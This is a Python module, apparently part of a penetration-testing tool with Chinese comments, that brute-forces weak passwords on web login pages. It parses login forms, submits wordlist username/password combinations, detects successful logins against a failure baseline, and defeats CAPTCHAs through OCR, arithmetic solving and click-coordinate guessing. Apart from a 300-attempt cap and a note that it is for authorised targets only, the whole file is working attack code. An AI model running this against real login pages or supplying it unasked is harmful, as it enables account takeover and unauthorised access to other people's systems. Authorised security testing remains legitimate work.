# -*- coding: utf-8 -*-
"""登录页弱口令爆破（独立模块，仅限授权目标）。

流程：GET 登录页 → 解析表单（action / 用户字段 / 密码字段 / 隐藏字段）
→ 用字典组合 POST 提交 → 按「失败基线 + 响应差异」判定命中。
安全护栏：请求总量硬上限（MAX_TRIES）、复用全局限速、
仅限授权目标的合规提示由调用方（UI/文档）承载。
"""
from pathlib import Path
from urllib.parse import urljoin

from bs4 import BeautifulSoup

USER_FIELDS = ["username", "user", "email", "account", "login", "loginname", "uname", "name"]
PASS_FIELDS = ["password", "passwd", "pass", "pwd", "userpass"]
MAX_TRIES = 300
_last_diag = {"forms": 0, "inputs": 0, "passwords": 0}


def load_list(path, limit):
    """字典加载：去空行，截取前 limit 条"""
    try:
        lines = Path(path).read_text(encoding="utf8", errors="ignore").splitlines()
    except OSError:
        return []
    return [l.strip() for l in lines if l.strip()][:limit]


def analyze_login_form(html, base_url):
    """解析登录表单（宽容版）。

    - 不要求 <form> 标签：无表单时在整个文档范围找密码框（JS 渲染站兜底）；
    - 字段名缺失时按 id / placeholder 推断（提交名用推断值，多数站点一致）；
    - 自动识别验证码字段（name/id 含 captcha/verif/code/valid）。
    返回 {action, method, user_field, pass_field, captcha_field, hidden, diag}
    或 None（diag 里带诊断计数供报错提示）。
    """
    import re as _re
    soup = BeautifulSoup(html, "html.parser")
    diag = {"forms": 0, "inputs": 0, "passwords": 0}
    global _last_diag
    scopes = []
    for form in soup.find_all("form"):
        diag["forms"] += 1
        scopes.append((form, urljoin(base_url, form.get("action") or base_url)))
    if not scopes:
        scopes.append((soup, base_url))               # 无 form 标签的页面

    cands = []
    for container, action in scopes:
        pw = usr = cap = None
        hidden = {}
        for i in container.find_all("input"):
            diag["inputs"] += 1
            itype = (i.get("type") or "text").lower()
            name = (i.get("name") or "").strip()
            alt = (i.get("id") or "").strip()
            ph = (i.get("placeholder") or "").strip()
            if itype in ("submit", "button", "image", "reset"):
                continue
            if itype == "hidden" and name:
                hidden[name] = i.get("value", "")
                continue
            key = (name + " " + alt + " " + ph).lower()
            if itype == "password":
                diag["passwords"] += 1
                pw = pw or name or alt or ph or "password"
            elif itype in ("text", "email", "tel") and not usr:
                if any(k in key for k in USER_FIELDS) or                    any(k in ph for k in ("用户", "账号", "帐号", "邮箱")):
                    usr = name or alt or "username"
            if not cap and _re.search(r"captcha|verif|code|valid", key, _re.I):
                cap = name or alt or "captcha"
        if pw:
            cand = {"action": action, "method": "post", "user_field": usr or "username",
                    "pass_field": pw, "captcha_field": cap, "hidden": hidden,
                    "diag": dict(diag)}
            score = (2 if usr else 0) + (1 if cap else 0)
            cands.append((score, cand))
    if not cands:
        global _last_diag
        _last_diag = dict(diag)
        return None
    cands.sort(key=lambda x: -x[0])
    return cands[0][1]


def is_success(resp, baseline):
    """命中判定：不在登录页（无密码框回显）且状态/内容偏离失败基线"""
    if resp is None:
        return False
    if resp.get("status", 0) >= 400:
        return False
    if resp.get("still_login"):
        return False
    if baseline:
        if resp.get("status") == baseline.get("status") and \
           abs(resp.get("size", 0) - baseline.get("size", 0)) < max(16, baseline.get("size", 0) * 0.15):
            return False
    return True


def brute_login(fetcher, url, usernames, passwords, progress=None,
                max_tries=MAX_TRIES, captcha=None):
    """执行爆破：返回命中列表 [{user, password, url}]。

    captcha: {"type": "digits|calc|click", "field": "captcha",
              "img_substr": "captcha"} 或 None。
    启用后每次尝试前都会刷新验证码（重新拉取登录页与验证码图）。
    """
    progress = progress or (lambda done, total, msg: None)
    captcha = captcha or {}
    cap_type = captcha.get("type")
    cap_field = captcha.get("field") or "captcha"
    combos = [(u, p) for u in usernames for p in passwords][:max(1, max_tries - 1)]
    per_attempt = 3 if cap_type else 1
    total = max(1, len(combos) * per_attempt + 1)
    attempts = 0

    page = fetcher.get_small(url)
    form = analyze_login_form(page.get("body") or "", url)
    if not form:
        d = _last_diag
        raise ValueError("未解析到含密码框的登录表单（输入框 %d 个，密码框 %d 个，表单 %d 个）。"
                         "若页面由 JS 动态渲染登录框，请改用传统表单登录页测试"
                         % (d.get("inputs", 0), d.get("passwords", 0), d.get("forms", 0)))
    if not captcha.get("field"):
        captcha["field"] = form.get("captcha_field") or "captcha"   # 自动识别验证码字段
    action, uf, pf = form["action"], form["user_field"], form["pass_field"]

    # 失败基线：第一组必然错误的提交
    baseline = fetcher.post_form(action, {uf: "__nl_probe__", pf: "__nl_probe__"}) or {}
    hits = []
    done = 0
    for user, pwd in combos:
        done += 1
        fields = dict(form.get("hidden") or {})
        fields[uf] = user
        fields[pf] = pwd
        if cap_type:
            attempts += 1
            page = fetcher.get_small(url)                     # 刷新验证码
            form = analyze_login_form(page.get("body") or "", url) or form
            cap_answer = _solve_captcha(fetcher, url, page.get("body") or "", captcha)
            if cap_answer is None:
                progress(done * per_attempt, total, "验证码识别失败，跳过 " + user)
                continue
            for k, v in cap_answer.items():
                fields[k] = v
        resp = fetcher.post_form(action, fields)
        progress(done * per_attempt, total, "%s / %s" % (user, "*" * len(pwd)))
        if is_success(resp, baseline):
            hits.append({"user": user, "password": pwd, "url": action})
            break                            # 命中一组即停，控制请求量
    return hits


def _solve_captcha(fetcher, url, html, captcha):
    """按类型求解验证码，返回要注入的表单字段 dict；失败返回 None"""
    from . import captcha as captcha_mod
    hint = captcha.get("img_substr") or "captcha|code|verify|valid"
    img_urls = captcha_mod.find_captcha_img(html, url, hint)
    if not img_urls:
        return None
    img = fetcher.fetch_bytes(img_urls[0])
    if not img:
        return None
    ctype = captcha.get("type")
    field = captcha.get("field") or "captcha"
    if ctype == "digits":
        try:
            # OCR 文本常带空格/换行等噪声，只保留字母数字
            import re as _re
            answer = _re.sub(r"[^0-9A-Za-z]", "", captcha_mod.ocr_image(img))
            return {field: answer} if answer else None
        except Exception:
            return None
    if ctype == "calc":
        try:
            answer, _text = captcha_mod.solve_calc_image(img)
        except Exception:
            answer = None
        if answer is None:                                # 退化为页面文本算术
            answer = captcha_mod.solve_calc_text(
                __import__("re").sub(r"<[^>]+>", " ", html))
        return {field: str(answer)} if answer is not None else None
    if ctype == "click":
        try:
            pts = captcha_mod.click_coordinates(img)
        except Exception:
            return None
        if not pts:
            return None
        out = {field + "_x": pts[0][0], field + "_y": pts[0][1]}
        for i, (x, y) in enumerate(pts[1:4], start=2):
            out[field + "_x%d" % i] = x
            out[field + "_y%d" % i] = y
        return out
    return None
